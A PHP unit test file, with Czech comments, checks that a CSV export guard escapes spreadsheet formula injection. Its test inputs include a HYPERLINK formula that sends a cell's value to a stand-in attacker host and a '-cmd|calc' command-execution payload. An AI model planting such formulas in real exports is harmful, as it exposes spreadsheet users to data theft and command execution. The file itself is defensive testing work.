<?php

declare(strict_types=1);

use ADT\Datagrid\Model\Export\FormulaGuard;
use Tester\Assert;

/**
 * FormulaGuard chrani CSV export pred formula injection (CWE-1236).
 *
 * Tyka se jen CSV - v XLSX je vzorec dany elementem <f>, ne obsahem retezce, takze se tam
 * hodnota neupravuje vubec a resi to SafeXlsxWriter.
 */

require __DIR__ . '/bootstrap.php';


test('vzorec dostane uvodni apostrof', function () {
	Assert::same(
		'\'=HYPERLINK("http://utocnik/?"&A2,"Klikni")',
		FormulaGuard::escape('=HYPERLINK("http://utocnik/?"&A2,"Klikni")')
	);
});


test('vsechny nebezpecne prefixy jsou osetrene', function () {
	// Excel bere jako zacatek vzorce i "+", "-", "@", tabulator a CR, ne jen "=".
	foreach (['=SUM(A1)', '+SUM(A1)', '-cmd|calc', '@SUM(A1)', "\tSUM(A1)", "\rSUM(A1)"] as $_payload) {
		Assert::same("'" . $_payload, FormulaGuard::escape($_payload), $_payload);
	}
});


test('bezny text zustava beze zmeny', function () {
	foreach (['Pivo 0,5l', 'Produkt 21% DPH', 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR', ''] as $_value) {
		Assert::same($_value, FormulaGuard::escape($_value));
	}
});


/**
 * Zaporne castky jsou ve skladovych reportech bezne a telefon s predvolbou zacina na "+".
 * Kdyby dostaly apostrof, staly by se z nich texty a sloupec by v Excelu prestal jit secist.
 */
test('cisla se neosetruji, i kdyz zacinaji na - nebo +', function () {
	foreach (['-42', '-1234.56', '+42', '0', '3.14'] as $_number) {
		Assert::same($_number, FormulaGuard::escape($_number));
	}
});


test('escapeRows projde cely export a zachova klice', function () {
	$rows = FormulaGuard::escapeRows([
		['Nazev produktu', 'Cena'],
		['Pivo 0,5l', '39'],
		['=HYPERLINK("http://utocnik","x")', '-10'],
	]);

	Assert::same([
		['Nazev produktu', 'Cena'],
		['Pivo 0,5l', '39'],
		['\'=HYPERLINK("http://utocnik","x")', '-10'],
	], $rows);
});


test('escapeRows nesaha na neretezcove hodnoty', function () {
	Assert::same([[42, 3.14, null, true]], FormulaGuard::escapeRows([[42, 3.14, null, true]]));
});
